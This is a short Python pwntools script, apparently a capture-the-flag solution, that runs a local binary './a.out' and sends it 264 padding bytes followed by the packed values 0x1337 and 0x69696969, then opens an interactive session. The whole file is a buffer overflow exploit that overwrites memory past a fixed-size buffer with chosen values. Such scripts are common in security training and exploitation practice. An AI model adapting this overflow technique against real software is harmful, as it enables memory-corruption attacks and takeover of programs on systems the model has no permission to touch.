#!/usr/bin/env python3

from pwn import *

p = process("./a.out")

p.recv()

payload  = 264*b'A' + p32(0x1337) + p32(0x69696969)

p.sendline(payload)
p.interactive()

